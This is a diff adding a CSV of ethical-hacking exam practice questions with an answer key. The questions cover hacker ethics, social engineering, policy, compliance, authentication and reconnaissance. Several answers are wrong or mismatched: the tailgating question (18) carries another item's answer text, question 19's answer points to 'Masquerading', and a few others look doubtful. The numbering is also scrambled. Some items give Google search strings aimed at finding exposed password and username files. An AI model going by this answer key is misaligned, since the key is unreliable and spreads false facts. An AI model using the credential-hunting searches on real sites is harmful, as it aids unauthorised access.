@@ -1,0 +1,3604 @@
+"﻿1. Which of the following statements regarding ethical hacking is incorrect?
+A. Ethical hackers should never use tools or methods that have the potential of exploiting vulnerabilities in an organization’s systems.
+B. Testing should be remotely performed offsite.
+C. An organization should use ethical hackers who do not sell vendor hardware/software or other consulting services.
+D. Ethical hacking should not involve writing to or modifying the target systems.
+","﻿A
+",1
+"2. First thing you do every office day is to check your email inbox. One morning, you received an email from your best friend and the subject line is quite strange. 
+What should you do?
+A. Delete the email and pretend nothing happened.
+B. Forward the message to your supervisor and ask for her opinion on how to handle the situation.
+C. Forward the message to your company’s security response team and permanently delete the message from your computer.
+D. Reply to the sender and ask them for more information about the message contents.
+","C
+",2
+"3. Bob received this text message on his mobile phone: ““Hello, this is Scott Smelby from the Yahoo Bank. Kindly contact me for a vital transaction on: scottsmelby@yahoo.com””. Which statement below is true?
+A. This is probably a legitimate message as it comes from a respectable organization.
+B. Bob should write to scottsmelby@yahoo.com to verify the identity of Scott.
+C. This is a scam as everybody can get a @yahoo address, not the Yahoo customer service employees.
+D. This is a scam because Bob does not know Scott.
+","C
+",3
+"4. In many states sending spam is illegal. Thus, the spammers have techniques to try and ensure that no one knows they sent the spam out to thousands of users at a time. Which of the following best describes what spammers use to hide the origin of these types of e-mails?
+A. A blacklist of companies that have their mail server relays configured to allow traffic only to their specific domain name.
+B. Mail relaying, which is a technique of bouncing e-mail from internal to external mails servers continuously.
+C. A blacklist of companies that have their mail server relays configured to be wide open.
+D. Tools that will reconfigure a mail server’s relay component to send the e-mail back to the spammers occasionally.
+","B
+",4
+"5. Bob, your senior colleague, has sent you a mail regarding a deal with one of the clients. You are requested to accept the offer and you oblige. After 2 days, Bob denies that he had ever sent a mail. What do you want to know to prove yourself that it was Bob who had send a mail
+Integrity
+Confidentiality
+Authentication
+Non-Repudiation
+","Non-Repudiation
+",5
+"6. The collection of potentially actionable, overt, and publicly available information is known as
+Open-source intelligence
+","Open-source intelligence
+",6
+"7. An IT security engineer notices that the company’s web server is currently being hacked. What should the engineer do next?
+A. Unplug the network connection on the company’s web server.
+B. Determine the origin of the attack and launch a counterattack.
+C. Record as much information as possible from the attack.
+D. Perform a system restart on the company’s web server.
+","C
+",7
+"8. A security consultant is trying to bid on a large contract that involves penetration testing and reporting. The company accepting bids wants proof of work so the consultant prints out several audits that have been performed. Which of the following is likely to occur as a result?
+A. The consultant will ask for money on the bid because of great work.
+B. The consultant may expose vulnerabilities of other companies.
+C. The company accepting bids will want the same type of format of testing.
+D. The company accepting bids will hire the consultant because of the great work performed.
+","B
+",8
+"9. What is the most secure way to mitigate the theft of corporate information from a laptop that was left in a hotel room?
+A. Back up everything on the laptop and store the backup in a safe place
+B. Use a strong logon password to the operating system
+C. Encrypt the data on the hard drive
+D. Set a BIOS password
+","C
+",9
+"10. Alice encrypts her data using her public key PK and stores the encrypted data in the cloud. Which of the following attack scenario will compromise the privacy of her data?
+Alice also stores her private key in the cloud, and Harry breaks into the cloud server as before
+","Alice also stores her private key in the cloud, and Harry breaks into the cloud server as before
+",10
+"11. A hacker is an intelligent individual with excellent computer skills that grant them the ability to explore a computer’s software and hardware without the owner’s permission. Their intention can either be to simply gain knowledge or to illegally make changes. Which of the following class of hacker refers to individual who work both offensively and defensively at various times?
+Gray Hat
+Black Hat
+Suicide Hacker (Don’t bother suffering long term jail)
+White Hat
+","Gray Hat
+",11
+"12. Nation-state threat actors often discover vulnerabilities and hold on to them until they want to launch a sophisticated attack. The Stuxnet attack was an unprecedented style of attack because it used four types of vulnerability. What is this style of attack called?
+A. zero-day
+B. zero-hour
+C. zero-sum
+D. no-day
+","A
+",12
+"13. A newly discovered flaw in a software application would be considered which kind of security vulnerability?
+A. Input validation flaw
+B. HTTP header injection vulnerability
+C. 0-day vulnerability
+D. Time-to-check to time-to-use flaw
+","C
+",13
+"14. Assume a business-crucial web-site of some company that is used to sell handsets to the customers worldwide. All the developed components are reviewed by the security team on a monthly basis. In order to drive business further, the web-site developer decided to add some 3rd party tools on it. The tools are written in Javascript and can track the customers’ activity on the site. These tools are located on the servers of the marketing company. What is the main security risk associated with this scenario?
+","External script contents could be maliciously modified without the security team knowledge
+",14
+"15. An IT employee got a call from one of our best customers. The caller wanted to know about the company’s network infrastructure, systems, and team. New opportunities of integration are in sight for both company and customer. What should this employee do?
+A. Since the company’s policy is all about Customer Service, he/she will provide information.
+B. Disregarding the call, the employee should hang up.
+C. The employee should not provide any information without previous management authorization.
+D. The employees can not provide any information; but, anyway, he/she will provide the name of the person in charge.
+","C
+",15
+"16. A well-intentioned researcher discovers a vulnerability on the web site of a major corporation. What should he do?
+Ignore it.
+Try to sell the information to a well-paying party on the dark web.
+Exploit the vulnerability without harming the web site owner so that attention be drawn to the problem.
+Notify the web site owner so that corrective action be taken as soon as possible to patch the vulnerability.
+","Notify the web site owner so that corrective action be taken as soon as possible to patch the vulnerability
+",16
+"17. To reduce the attack surface of a system, administrators should perform which of the following processes to remove unnecessary software, services, and insecure configuration settings?
+A. Harvesting
+B. Windowing
+C. Hardening
+D. Stealthing
+","C
+",17
+"18. An unauthorized individual enters a building following an employee through the employee entrance after the lunch rush. What type of breach has the individual just performed?
+Announced
+Piggybacking
+Reverse Social Engineering
+Tailgating
+","Notify the web site owner so that corrective action be taken as soon as possible to patch the vulnerability
+",18
+"19. Jimmy is standing outside a secure entrance to a facility. He is pretending to having a tense conversation on his cell phone as an authorized employee badges in. Jimmy, while still on the phone, grabs the door as it begins to close. What just happened?
+Masquerading
+Whaling
+Phishing
+Tailgating (Piggybacking)
+","A
+",19
+"20. It is an entity or event with the potential to adversely impact a system through unauthorized access, destruction, disclosure, denial of service or modification of data.
+Which of the following terms best matches the definition?
+A. Threat
+B. Attack
+C. Vulnerability
+D. Risk
+","A
+",20
+"21. A certified ethical hacker (CEH) is approached by a friend who believes her husband is cheating. She offers to pay to break into her husband’s email account in order to find proof so she can take him to court. What is the ethical response?
+A. Say no; the friend is not the owner of the account.
+B. Say yes; the friend needs help to gather evidence.
+C. Say yes; do the job for free.
+D. Say no; make sure that the friend knows the risk she’s asking the CEH to take.
+","D
+",21
+"22. A computer technician is using a new version of a word processing software package when it is discovered that a special sequence of characters causes the entire computer to crash. The technician researches the bug and discovers that no one else experienced the problem. What is the appropriate next step?
+A. Ignore the problem completely and let someone else deal with it.
+B. Create a document that will crash the computer when opened and send it to friends.
+C. Find an underground bulletin board and attempt to sell the bug to the highest bidder.
+D. Notify the vendor of the bug and do not disclose it until the vendor gets a chance to issue a fix.
+","D
+",22
+"23. While you were gathering information as part of security assessments for one of your clients, you were able to gather data that show your client is involved with fraudulent activities. What should you do?
+A. Immediately stop work and contact the proper legal authorities
+B. Ignore the data and continue the assessment until completed as agreed
+C. Confront the client in a respectful manner and ask her about the data
+D. Copy the data to removable media and keep it in case you need it
+","A
+",23
+"24. A consultant has been hired by the V.P. of a large financial organization to assess the company’s security posture. During the security testing, the consultant comes across child pornography on the V.P.’s computer. What is the consultant’s obligation to the financial organization?
+A. Say nothing and continue with the security testing.
+B. Stop work immediately and contact the authorities.
+C. Delete the pornography, say nothing, and continue security testing.
+D. Bring the discovery to the financial organization’s human resource department.
+","B
+",24
+"25. Your company performs penetration tests and security assessments for small and medium-sized business in the local area. During a routine security assessment, you discover information that suggests your client is involved in human trafficking. What should you do?
+Immediately stop work and contact the proper legal authorities
+Confront the client in a respectful manner and ask her about the data
+Copy the data to removable media and keep it in case you need it
+Ignore the data and continue the assessment until completed as agreed
+","Immediately stop work and contact the proper legal authorities
+",25
+"26. A certified ethical hacker (CEH) completed a penetration test of the main headquarters of a company almost two months ago, but has yet to get paid. The customer is suffering from financial problems, and the CEH is worried that the company will go out of business and end up not paying. What actions should the CEH take?
+A. Threaten to publish the penetration test results if not paid.
+B. Follow proper legal procedures against the company to request payment.
+C. Tell other customers of the financial problems with payments from this company.
+D. Exploit some of the vulnerabilities found on the company webserver to deface it.
+","B
+",26
+"27. An ethical hacker for a large security research firm performs penetration tests, vulnerability tests, and risk assessments. A friend recently started a company and asks the hacker to perform a penetration test and vulnerability assessment of the new company as a favor. What should the hacker’s next step be before starting work on this job?
+A. Start by foot printing the network and mapping out a plan of attack.
+B. Ask the employer for authorization to perform the work outside the company.
+C. Begin the reconnaissance phase with passive information gathering and then move into active information gathering.
+D. Use social engineering techniques on the friend’s employees to help identify areas that may be susceptible to attack.
+","B
+",27
+"28. Sophia travels a lot and worries that her laptop containing confidential documents might be stolen. What is the best protection that will work for her?
+BIOS password
+Password protected files
+Hidden folders
+Full disk encryption
+","Full disk encryption
+",28
+"29. Backing up data is a security must. However, it also has certain level of risks when mishandled. Which of the following is the greatest threat posed by backups?
+A. A backup is the source of Malware or illicit information
+B. A backup is incomplete because no verification was performed
+C. A backup is unavailable during disaster recovery
+D. An unencrypted backup can be misplaced or stolen
+","d
+",29
+"30. A bank stores and processes sensitive privacy information related to home loans. However, auditing has never been enabled on the system. What is the first step that the bank should take before enabling the audit feature?
+Perform a cost/benefit analysis of the audit feature
+Determine the impact of enabling the audit feature
+Perform a vulnerability scan of the system
+Allocate funds for staffing of audit log review
+","Determine the impact of enabling the audit feature
+",30
+"31. Low humidity in a data center can cause which of the following problems?
+A. Heat
+B. Corrosion
+C. Static electricity
+D. Airborne contamination
+","C
+",31
+"32. Which of the following examples best represents a logical or technical control?
+A. Security tokens
+B. Heating and air conditioning
+C. Smoke and fire alarms
+D. Corporate security policy
+","A
+",32
+"33. What is one thing a tester can do to ensure that the software is trusted and is not changing or tampering with critical data on the back end of a system it is loaded on?
+A. Proper testing
+B. Secure coding principles
+C. Systems security and architecture review
+D. Analysis of interrupts within the software
+","D
+",33
+"34. What would you type on the Windows command line in order to launch the Computer Management Console provided that you are logged in as an admin?
+A. c:\\compmgmt.msc
+B. c:\\gpedit
+C. c:\\ncpa.cpl
+D. c:\\services.msc
+","A
+",34
+"35. If you are to determine the attack surface of an organization, which of the following security operations is the BEST thing to do?
+A. Running a network scan to detect network services in the corporate DMZ
+B. Reviewing the need for a security clearance for each employee
+C. Using configuration management to determine when and where to apply security patches
+D. Training employees on the security policy regarding social engineering
+","A
+",35
+"36. A big company, who wanted to test their security infrastructure, wants to hire elite pen testers like you. During the interview, they asked you to show sample reports from previous penetration tests. What should you do?
+A. Share reports, after NDA is signed
+B. Share full reports, not redacted
+C. Decline but, provide references
+D. Share full reports with redactions
+","C
+",36
+"37. Your next door neighbor, that you do not get along with, is having issues with their network, so he yells to his spouse the network’s SSID and password and you hear them both clearly. What do you do with this information?
+A. Nothing, but suggest to him to change the network’s SSID and password.
+B. Sell his SSID and password to friends that come to your house, so it doesn’t slow down your network.
+C. Log onto to his network, after all it’s his fault that you can get in.
+D. Only use his network when you have large downloads so you don’t tax your own network.
+","A
+",37
+"38. What network security concept requires multiple layers of security controls to be placed throughout an IT infrastructure, which improves the security posture of an organization to defend against malicious attacks or potential vulnerabilities?
+A. Security through obscurity
+B. Host-Based Intrusion Detection System
+C. Defense in depth
+D. Network-Based Intrusion Detection System
+","C
+",38
+"39. You are performing a penetration test. You achieved access via a buffer overflow exploit and you proceed to find interesting data, such as files with usernames and passwords. You find a hidden folder that has the administrator’s bank account password and login information for the administrator’s bitcoin account. What should you do?
+Transfer money from the administrator’s account to another account.
+Do not report it and continue the penetration test.
+Do not transfer the money but steal the bitcoins.
+Report immediately to the administrator.
+","Report immediately to the administrator.
+",39
+"40. Scenario: 1. Victim opens the attacker’s web site. 2. Attacker sets up a web site which contains interesting and attractive content like ‘Do you want to make $1000 in a day?’. 3. Victim clicks to the interesting and attractive content url. 4. Attacker creates a transparent ‘iframe’ in front of the url which victim attempt to click, so victim thinks that he/she clicks to the ‘Do you want to make $1000 in a day?’ url but actually he/she clicks to the content or url that exists in the transparent ‘iframe’ which is setup by the attacker. What is the name of the attack which is mentioned in the scenario?
+A. HTTP Parameter Pollution (Manipulating query parameters on URL)
+B. HTML Injection (Control input point to inject arbitrary HTML code into vulnerable page)
+C. Session Fixation (Hijack valid user session, allows one person to fixate another person session ID)
+D. ClickJacking Attack (UI redress attack when user is tricked to click on something)
+","D
+",40
+"41. Which type of security feature stops vehicles from crashing through the doors of a building?
+A. Turnstile
+B. Bollards
+C. Mantrap
+D. Receptionist
+","B
+",41
+"42. During a security audit of IT processes, an IS auditor found that there were no documented security procedures. What should the IS auditor do?
+A. Identify and evaluate existing practices
+B. Create a procedures document
+C. Conduct compliance testing
+D. Terminate the audit
+","A
+",42
+"43. Which of the following is an advantage of utilizing security testing methodologies to conduct a security audit?
+A. They provide a repeatable framework.
+B. Anyone can run the command line scripts.
+C. They are available at low cost.
+D. They are subject to government regulation.
+","A
+",43
+"44. Which of the following can the administrator do to verify that a tape backup can be recovered in its entirety?
+A. Restore a random file.
+B. Perform a full restore.
+C. Read the first 512 bytes of the tape.
+D. Read the last 512 bytes of the tape.
+","B
+",44
+"45. Knowing the nature of backup tapes, which of the following is the MOST RECOMMENDED way of storing backup tapes?
+A. In a cool dry environment
+B. Inside the data center for faster retrieval in a fireproof safe
+C. In a climate controlled facility offsite
+D. On a different floor in the same building
+","C
+",45
+"46. Security Policy is a definition of what it means to be secure for a system, organization or other entity. For Information Technologies, there are sub-policies like; Computer Security Policy, Information Protection Policy, Information Security Policy, Network Security Policy, Physical Security Policy, Remote Access Policy, User Account Policy. What is main theme of the sub-policies for Information Technologies?
+Authenticity, Confidentiality, Integrity
+Confidentiality, Integrity, Availability
+Availability, Non-repudiation, Confidentiality
+Authenticity, Integrity, Non-repudiation
+","Confidentiality, Integrity, Availability
+",46
+"47. An enterprise recently moved to a new office and the new neighborhood is a little risky. The CEO wants to monitor the physical perimeter and the entrance doors 24 hours. What is the best option to do this job?
+A. Use fences in the entrance doors.
+B. Install a CCTV with cameras pointing to the entrance doors and the street.
+C. Use an IDS in the entrance doors and install some of them near the corners.
+D. Use lights in all the entrance doors and along the company’s perimeter.
+","B
+",47
+"48. If executives are found liable for not properly protecting their company’s assets and information systems, what type of law would apply in this situation?
+Common
+Civil
+International
+Criminal
+","Civil
+",48
+"49. Which type of security document is written with specific step-by-step details?
+A. Process
+B. Procedure
+C. Policy
+D. Paradigm
+","B
+",49
+"50. A security policy will be more accepted by employees if it is consistent and has the support of
+A. coworkers.
+B. executive management.
+C. the security officer.
+D. a supervisor.
+","B
+",50
+"51. Which of the following is a detective control?
+A. Smart card authentication
+B. Security policy
+C. Audit trail
+D. Continuity of operations plan
+","C
+",51
+"52. Which of the following is a preventive control?
+A. Smart card authentication
+B. Security policy
+C. Audit trail
+D. Continuity of operations plan
+","A
+",52
+"89. What are the three types of authentication?
+A. Something you: know, remember, prove
+B. Something you: have, know, are
+C. Something you: show, prove, are
+D. Something you: show, have, prove
+","B
+",89
+"53. A Network Administrator was recently promoted to Chief Security Officer at a local university. One of employee’s new responsibilities is to manage the implementation of an RFID card access system to a new server room on campus. The server room will house student enrollment information that is securely backed up to an off-site location.During a meeting with an outside consultant, the Chief Security Officer explains that he is concerned that the existing security controls have not been designed properly. Currently, the Network Administrator is responsible for approving and issuing RFID card access to the server room, as well as reviewing the electronic access logs on a weekly basis. Which of the following is an issue with the situation?
+A. Segregation of duties
+B. Undue influence
+C. Lack of experience
+D. Inadequate disaster recovery plan
+","A
+",53
+"54. A company has hired a security administrator to maintain and administer Linux and Windows-based systems. Written in the nightly report file is the following: Firewall log files are at the expected value of 4 MB. The current time is 12am. Exactly two hours later the size has decreased considerably. Another hour goes by and the log files have shrunk in size again. Which of the following actions should the security administrator take?
+A. Log the event as suspicious activity and report this behavior to the incident response team immediately.
+B. Log the event as suspicious activity, call a manager, and report this as soon as possible.
+C. Run an anti-virus scan because it is likely the system is infected by malware.
+D. Log the event as suspicious activity, continue to investigate, and act according to the site’s security policy.
+","D
+",54
+"55. The precaution of prohibiting employees from bringing personal computing devices into a facility is what type of security control?
+A. Physical
+B. Procedural
+C. Technical
+D. Compliance
+","B
+",55
+"56. Which of the following business challenges could be solved by using a vulnerability scanner?
+A. Auditors want to discover if all systems are following a standard naming convention.
+B. A web server was compromised and management needs to know if any further systems were compromised.
+C. There is an emergency need to remove administrator access from multiple machines for an employee that quit.
+D. There is a monthly requirement to test corporate compliance with host application usage and security policies.
+","D
+",56
+"57. How can a policy help improve an employee’s security awareness?
+A. By implementing written security procedures, enabling employee security training, and promoting the benefits of security
+B. By using informal networks of communication, establishing secret passing procedures, and immediately terminating employees
+C. By sharing security secrets with employees, enabling employees to share secrets, and establishing a consultative help line
+D. By decreasing an employee’s vacation time, addressing ad-hoc employment clauses, and ensuring that managers know employee strengths
+","A
+",57
+"58. Due to a slowdown of normal network operations, IT department decided to monitor internet traffic for all of the employees. From a legal stand point, what would be troublesome to take this kind of measure?
+A. All of the employees would stop normal work activities
+B. IT department would be telling employees who the boss is
+C. Not informing the employees that they are going to be monitored could be an invasion of privacy.
+D. The network could still experience traffic slow down.
+","C
+",58
+"59. Craig received a report of all the computers on the network that showed all the missing patches and weak passwords. What type of software generated this report?
+A. a port scanner
+B. a vulnerability scanner
+C. a virus scanner
+D. a malware scanner
+","B
+",59
+"60. Which of the following processes evaluates the adherence of an organization to its stated security policy?
+A. Vulnerability assessment
+B. Penetration testing
+C. Risk assessment
+D. Security auditing
+","D
+",60
+"61. The intrusion detection system at a software development company suddenly generates multiple alerts regarding attacks against the company’s external webserver, VPN concentrator, and DNS servers. What should the security team do to determine which alerts to check first?
+A. Investigate based on the maintenance schedule of the affected systems.
+B. Investigate based on the service level agreements of the systems.
+C. Investigate based on the potential effect of the incident.
+D. Investigate based on the order that the alerts arrived in.
+","C
+",61
+"62. As a Certified Ethical Hacker, you were contracted by a private firm to conduct an external security assessment through penetration testing. What document describes the specifics of the testing, the associated violations, and essentially protects both the organization’s interest and your liabilities as a tester?
+Project Scope
+Rules of Engagement
+Service Level Agreement
+Non-Disclosure Agreement
+","Rules of Engagement
+",62
+"63. In an internal security audit, the white hat hacker gains control over a user account and attempts to acquire access to another account’s confidential files and information. How can he achieve this?
+A. Port Scanning
+B. Hacking Active Directory
+C. Privilege Escalation
+D. Shoulder-Surfing
+","C
+",63
+"64. Least privilege is a security concept that requires that a user is
+A. limited to those functions required to do the job.
+B. given root or administrative privileges.
+C. trusted to keep all data and access to that data under their sole control.
+D. given privileges equal to everyone else in the department.
+","A
+",64
+"65. When creating a security program, which approach would be used if senior management is supporting and enforcing the security policy?
+A. A bottom-up approach
+B. A top-down approach
+C. A senior creation approach
+D. An IT assurance approach
+","B
+",65
+"66. Defining rules, collaborating human workforce, creating a backup plan, and testing the plans are within what phase of the Incident Handling Process?
+A. Preparation phase
+B. Containment phase
+C. Recovery phase
+D. Identification phase
+","A
+",66
+"67. What is the term coined for logging, recording and resolving events in a company?
+A. Internal Procedure
+B. Security Policy
+C. Incident Management Process
+D. Metrics
+","C
+",67
+"68. Describes the specifics of the testing, the associated violations, and essentially protects both the bank’s interest and your liabilities as a tester?
+A. Service Level Agreement
+B. Non-Disclosure Agreement
+C. Terms of Engagement
+D. Project Scope
+","C
+",68
+"69. Which initial procedure should an ethical hacker perform after being brought into an organization?
+A. Begin security testing.
+B. Turn over deliverables.
+C. Sign a formal contract with non-disclosure.
+D. Assess what the organization is trying to protect.
+","C
+",69
+"70. Which of the following ensures that updates to policies, procedures, and configurations are made in a controlled and documented fashion?
+A. Regulatory compliance
+B. Peer review
+C. Change management
+D. Penetration testing
+","C
+",70
+"147. In Wireshark, the packet bytes panes show the data of the current packet in which format?
+Decimal
+ASCII only
+Hexadecimal
+Binary
+","Hexadecimal
+",147
+"71. How do employers protect assets with security policies pertaining to employee surveillance activities?
+A. Employers promote monitoring activities of employees as long as the employees demonstrate trustworthiness.
+B. Employers use informal verbal communication channels to explain employee monitoring activities to employees.
+C. Employers use network surveillance to monitor employee email traffic, network access, and to record employee keystrokes.
+D. Employers provide employees written statements that clearly discuss the boundaries of monitoring activities and consequences.
+","D
+",71
+"72. Which United States legislation mandates that the Chief Executive Officer (CEO) and the Chief Financial Officer (CFO) must sign statements verifying the completeness and accuracy of financial reports?
+A. Sarbanes-Oxley Act (SOX)
+B. Gramm-Leach-Bliley Act (GLBA)
+C. Fair and Accurate Credit Transactions Act (FACTA)
+D. Federal Information Security Management Act (FISMA)
+","A
+",72
+"73. It has been reported to you that someone has caused an information spillage on their computer. You go to the computer, disconnect it from the network, remove the keyboard and mouse, and power it down. What step in incident handling did you just complete?
+A. Containment (Keeping something harmful under control)
+B. Eradication (Removing cause of incident)
+C. Recovery (Restoration, back to normal)
+D. Discovery
+","A
+",73
+"74. Which vital role does the U.S. Computer Security Incident Response Team (CSIRT) provide?
+A. Incident response services to any user, company, government agency, or organization in partnership with the Department of Homeland Security
+B. Maintenance of the nation’s Internet infrastructure, builds out new Internet infrastructure, and decommissions old Internet infrastructure
+C. Registration of critical penetration testing for the Department of Homeland Security and public and private sectors
+D. Measurement of key vulnerability assessments on behalf of the Department of Defense (DOD) and State Department, as well as private sectors
+","A
+",74
+"75. Which of the following is a primary service of the U.S. Computer Security Incident Response Team (CSIRT)?
+A. CSIRT provides an incident response service to enable a reliable and trusted single point of contact for reporting computer security incidents worldwide.
+B. CSIRT provides a computer security surveillance service to supply a government with important intelligence information on individuals travelling abroad.
+C. CSIRT provides a penetration testing service to support exception reporting on incidents worldwide by individuals and multi-national corporations.
+D. CSIRT provides a vulnerability assessment service to assist law enforcement agencies with profiling an individual’s property or company’s asset.
+","A
+",75
+"76. What are the three types of compliance that the Open Source Security Testing Methodology Manual (OSSTMM) recognizes?
+A. Legal, performance, audit
+B. Audit, standards based, regulatory
+C. Contractual, regulatory, industry
+D. Legislative, contractual, standards based
+","D
+",76
+"77. Under the “Post-attack Phase and Activities”, it is the responsibility of the tester to restore the systems to a pretest state.Which of the following activities should not be included in this phase? I. Removing all files uploaded on the system II. Cleaning all registry entries III. Mapping of network state IV. Removing all tools and maintaining backdoor for reporting
+A. III
+B. IV
+C. III and IV
+D. All should be included
+","A
+",77
+"78. It is a regulation that has a set of guidelines, which should be adhered to by anyone who handles any electronic medical data. These guidelines stipulate that all medical practices must ensure that all necessary measures are in place while saving, accessing, and sharing any electronic medical data to keep patient data secure. 
+Which of the following regulations best matches the description?
+COBIT
+FISMA
+ISO/IEC 27002
+HIPAA
+","HIPAA
+",78
+"79. Which of the following act requires employers standard national numbers to identify them on standard transactions
+PCI-DSS
+HIPAA
+DMCA
+SOX
+","HIPAA
+",79
+"80. Which of the following tools would be the best choice for achieving compliance with PCI Requirement 11?
+A. Truecrypt
+B. Sub7
+C. Nessus
+D. Clamwin
+","C
+",80
+"81. Security and privacy of/on information systems are two entities that requires lawful regulations. Which of the following regulations defines security and privacy controls for Federal information systems and organizations?
+A. NIST SP 800-53
+B. PCI-DSS
+C. EU Safe Harbor
+D. HIPAA
+","A
+",81
+"82. International Organization for Standardization (ISO) standard 27002 provides guidance for compliance by outlining
+A. guidelines and practices for security controls.
+B. financial soundness and business viability metrics.
+C. standard best practice for configuration management.
+D. contract agreement writing standards.
+","A
+",82
+"83. What is the name of the international standard that establishes a baseline level of confidence in the security functionality of IT products by providing a set of requirements for evaluation?
+A. Blue Book
+B. ISO 26029
+C. Common Criteria
+D. The Wassenaar Agreement
+","C
+",83
+"84. Which of the following guidelines or standards is associated with the credit card industry?
+A. Control Objectives for Information and Related Technology (COBIT)
+B. Sarbanes-Oxley Act (SOX)
+C. Health Insurance Portability and Accountability Act (HIPAA)
+D. Payment Card Industry Data Security Standards (PCI DSS)
+","D
+",84
+"85. This international organization regulates billions of transactions daily and provides security guidelines to protect personally identifiable information (PII). These security controls provide a baseline and prevent low-level hackers sometimes known as script kiddies from causing a data breach. Which of the following organizations is being described?
+A. Payment Card Industry (PCI)
+B. Center for Disease Control (CDC)
+C. Institute of Electrical and Electronics Engineers (IEEE)
+D. International Security Industry Organization (ISIO)
+","A
+",85
+"86. What is not a PCI compliance recommendation?
+A. Limit access to card holder data to as few individuals as possible.
+B. Use encryption to protect all transmission of card holder data over any public network.
+C. Rotate employees handling credit card transactions on a yearly basis to different departments.
+D. Use a firewall between the public network and the payment card data.
+","C
+",86
+"87. When does the Payment Card Industry Data Security Standard (PCI-DSS) require organizations to perform external and internal penetration testing?
+At least twice a year and after any significant infrastructure or application upgrade or modification
+At least once a year and after any significant infrastructure or application upgrade or modification
+At least once every two years and after any significant infrastructure or application upgrade or modification
+At least once every three years and after any significant infrastructure or application upgrade or modification
+","At least once a year and after any significant infrastructure or application upgrade or modification
+",87
+"88. Which of the following is NOT an ideal choice for biometric controls?
+A. Iris patterns
+B. Fingerprints
+C. Height and weight
+D. Voice
+","C
+",88
+"90. By using a smart card and pin, you are using a two-factor authentication that satisfies
+A. Something you know and something you are
+B. Something you have and something you know
+C. Something you have and something you are
+D. Something you are and something you remember
+","B
+",90
+"91. Which of the following is an example of two factor authentication?
+A. PIN Number and Birth Date
+B. Username and Password
+C. Digital Certificate and Hardware Token
+D. Fingerprint and Smartcard ID
+","D
+",91
+"92. Which set of access control solutions implements two-factor authentication?
+A. USB token and PIN
+B. Fingerprint scanner and retina scanner
+C. Password and PIN
+D. Account and password
+","A
+",92
+"93. Bob learned that his username and password for a popular game has been compromised. He contacts the company and resets all the information. The company suggests he use two-factor authentication, which option below offers that?
+A new username and password
+Disable his username and use just a fingerprint scanner.
+His username and a stronger password
+A fingerprint scanner and his username and password
+","A fingerprint scanner and his username and password
+",93
+"94. Todd has been asked by the security officer to purchase a counter-based authentication system. Which of the following best describes this type of system?
+A. A biometric system that bases authentication decisions on behavioral attributes.
+B. A biometric system that bases authentication decisions on physical attributes.
+C. An authentication system that creates one-time passwords that are encrypted with secret keys.
+D. An authentication system that uses passphrases that are converted into virtual passwords.
+","C
+",94
+"95. Steve, a scientist who works in a governmental security agency, developed a technological solution to identify people based on walking patterns and implemented this approach to a physical control access. A camera captures people walking and identifies the individuals using Steve’s approach. After that, people must approximate their RFID badges. Both the identifications are required to open the door. In this case, we can say:_______________
+","The solution implements the two authentication factors: physical object and physical characteristic
+",95
+"96. Which of the following is optimized for confidential communications, such as bidirectional voice and video?
+A. RC4
+B. RC5
+C. MD4
+D. MD5
+","A
+",96
+"97. Which type of scan measures a person’s external features through a digital video camera?
+A. Iris scan
+B. Retinal scan
+C. Facial recognition scan
+D. Signature kinetics scan
+","C
+",97
+"98. Which type of scan is used on the eye to measure the layer of blood vessels?
+A. Facial recognition scan
+B. Retinal scan
+C. Iris scan
+D. Signature kinetics scan
+","B
+",98
+"99. What is the main reason the use of a stored biometric is vulnerable to an attack?
+A. The digital representation of the biometric might not be unique, even if the physical characteristic is unique.
+B. Authentication using a stored biometric compares a copy to a copy instead of the original to a copy.
+C. A stored biometric is no longer “something you are” and instead becomes “something you have”.
+D. A stored biometric can be stolen and used by an attacker to impersonate the individual identified by the biometric.
+","D
+",99
+"100. What is the best defense against privilege escalation vulnerability?
+A. Patch systems regularly and upgrade interactive login privileges at the system administrator level.
+B. Run administrator and applications on least privileges and use a content registry for tracking.
+C. Run services with least privileged accounts and implement multi-factor authentication and authorization.
+D. Review user roles and administrator privileges for maximum utilization of automation services.
+","B
+",100
+"101. Which access control mechanism allows for multiple systems to use a central authentication server (CAS) that permits users to authenticate once and gain access to multiple systems?
+A. Role Based Access Control (RBAC)
+B. Discretionary Access Control (DAC)
+C. Windows authentication
+D. Single sign-on
+","D
+",101
+"102. When purchasing a biometric system, one of the considerations that should be reviewed is the processing speed. Which of the following best describes what it is meant by processing?
+A. The amount of time it takes to convert biometric data into a template on a smart card.
+B. The amount of time and resources that are necessary to maintain a biometric system.
+C. The amount of time it takes to be either accepted or rejected form when an individual provides Identification and authentication information.
+D. How long it takes to setup individual user accounts.
+","C
+",102
+"103. A large mobile telephony and data network operator has a data that houses network elements. These are essentially large computers running on Linux. The perimeter of the data center is secured with firewalls and IPS systems. What is the best security policy concerning this setup?
+A. Network elements must be hardened with user ids and strong passwords. Regular security tests and audits should be performed.
+B. As long as the physical access to the network elements is restricted, there is no need for additional measures.
+C. There is no need for specific security measures on the network elements as long as firewalls and IPSsystems exist.
+D. The operator knows that attacks and down time are inevitable and should have a backup site.
+","A
+",103
+"104. A company recently hired your team of Ethical Hackers to test the security of their network systems. The company wants to have the attack be as realistic as possible. They did not provide any information besides the name of their company. What phase of security testing would your team jump in right away?
+A. Scanning
+B. Reconnaissance
+C. Escalation
+D. Enumeration
+","B
+",104
+"105. Passive reconnaissance involves collecting information through which of the following?
+A. Social engineering
+B. Network traffic sniffing
+C. Man in the middle attacks
+D. Publicly accessible sources
+","D
+",105
+"106. Which results will be returned with the following Google search query? site:target.com -site:Marketing.target.com accounting
+A. Results from matches on the site marketing.target.com that are in the domain target.com but do not include the word accounting
+B. Results for matches on target.com and Marketing.target.com that include the word “accounting”
+C. Results matching “accounting” in domain target.com but not on the site Marketing.target.com
+D. Results matching all words in the query
+","C
+",106
+"107. Which one of the following Google advanced search operators allows an attacker to restrict the results to those websites in the given domain
+[site:]
+[cache:]
+[link:]
+[inurl:]
+","[site:]
+",107
+"108. This phase will increase the odds of success in later phases of the penetration test. It is also the very first step in Information Gathering, and it will tell you what the “landscape” looks like. Which of the following is the most important phase of ethical hacking wherein you need to spend considerable amount of time?
+A. Gaining access
+B. Escalating privileges
+C. Network mapping
+D. Footprinting
+","D
+",108
+"109. In which phase of the ethical hacking process can Google hacking be employed? This is a technique that involves manipulating a search string with specific operators to search for vulnerabilities. Example: allintitle: root passwd
+A. Maintaining Access
+B. Gaining Access
+C. Reconnaissance
+D. Scanning and Enumeration
+","C
+",109
+"110. When you are collecting information to perform a data analysis, Google commands are very useful to find sensitive information and files. These files may contain information about passwords, system functions, or documentation.
+What command will help you to search files using Google as a search engine?
+A. site: target.com filetype:xls username password email
